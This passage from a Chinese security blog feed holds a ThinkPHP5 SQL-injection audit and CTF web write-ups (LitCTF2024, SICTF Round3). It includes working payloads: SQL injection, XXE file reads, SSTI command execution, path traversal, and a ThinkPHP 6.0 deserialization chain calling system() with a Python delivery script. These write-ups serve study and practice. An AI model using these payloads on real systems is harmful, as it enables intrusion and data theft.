</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">            [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>]</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">paraseWhere</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>],<span class="variable">$options</span>),</span><br><span class="line">            <span class="variable">$this</span>-&gt;selectSql);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span>(<span class="params"><span class="variable">$where</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whereStr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildWhere</span>(<span class="variable">$where</span>, <span class="variable">$options</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable">$whereStr</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; WHERE &#x27;</span> . <span class="variable">$whereStr</span>;</span><br><span class="line">     &#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进paraseWhere方法中的buildWhere函数，发现用户可控数据又被传入了paraseWhereItem where子单元分析函数</p><p>当操作符为exp时，将来自用户的数据直接拼接SQL语句，导致SQL注入漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span>[] = <span class="string">&#x27; &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhereItem</span>(<span class="variable">$field</span>, <span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$options</span>, <span class="variable">$binds</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">elseif</span> (<span class="string">&#x27;EXP&#x27;</span> == <span class="variable">$exp</span>) &#123;</span><br><span class="line">            <span class="comment">// 表达式查询</span></span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="string">&#x27;( &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27; )&#x27;</span>;</span><br></pre></td></tr></table></figure><p>那么构造payload时只需要闭合)+注释即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public/index.php/index/index?username=)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/5.png" alt="5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;漏洞影响版本:ThinkPHP5全版本&lt;/p&gt;
&lt;p&gt;Index.php&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>LitCTF2024 Web题解</title>
    <link href="http://example.com/2024/06/01/LitCTF2024-web%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2024/06/01/LitCTF2024-web%E9%A2%98%E8%A7%A3/</id>
    <published>2024-06-01T06:01:01.000Z</published>
    <updated>2024-08-22T09:55:46.755Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h1><p>简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="string">&#x27;secure_password&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;secure_password&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754622.png" alt="image-20240601140250560"></p><h1 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h1><p>xxepayload直接打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;mypass&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754898.png" alt="image-20240601140543276"></p><h1 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h1><p>SSTI</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[453].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755208.png" alt="image-20240601140815281"></p><h1 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h1><p>直接输入file:&#x2F;&#x2F;&#x2F;flag</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755906.png" alt="image-20240601140911470"></p><h1 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h1><p>打开发现</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755017.png" alt="image-20240601140958838"></p><p>这个url没有用</p><p>更换主题theme&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755144.png" alt="image-20240601141117008"></p><h1 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h1><p>第一层套娃</p><p>第二层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><p>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755071.png" alt="image-20240601141400819"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SAS-Serializing-Authentication-System&quot;&gt;&lt;a href=&quot;#SAS-Serializing-Authentication-System&quot; class=&quot;headerlink&quot; title=&quot;SAS - Serializing </summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SICTF Round3 Web题解</title>
    <link href="http://example.com/2024/02/19/SICTF-Round-3-Web%E9%83%A8%E5%88%86wp/"/>
    <id>http://example.com/2024/02/19/SICTF-Round-3-Web%E9%83%A8%E5%88%86wp/</id>
    <published>2024-02-19T02:01:29.000Z</published>
    <updated>2024-08-22T09:54:46.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h1><p>打开环境发现文件包含</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221752424.png" alt="image-20240218201755319"></p><p>题目提示不能上传php文件，直接传一个图片马</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221752298.png" alt="image-20240218202359704"></p><p>RCE</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753751.png" alt="image-20240218202519654"></p><h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Exploit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hint:hide other file</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>flag在html&#x2F;flag.php</p><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>=<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">client</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;s:7:&quot;payload&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>base64解码</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753878.png" alt="image-20240218202938028"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753829.png" alt="image-20240218202946529"></p><h1 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h1><p><a href="http://www.zip下载源码代码审计/">www.zip下载源码代码审计</a></p><p>thinkphp6.0</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753936.png" alt="image-20240218203202526"></p><p>index.php GET传参left和right弱比较，POST传参key利用prce回溯绕过，并且payload存在反序列化</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753613.png" alt="image-20240218203240920"></p><p>Model.php，发现flag所在文件</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753578.png" alt="image-20240218203556909"></p><p>直接用tp6.0的链子打反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>+<span class="string">&#x27;603THINKPHP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;payload&#x27;</span>:<span class="string">&quot;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://yuanshen.life:38972/?left=QNKCDZO&amp;right=240610708&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753997.png" alt="image-20240218204013287"></p><h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title 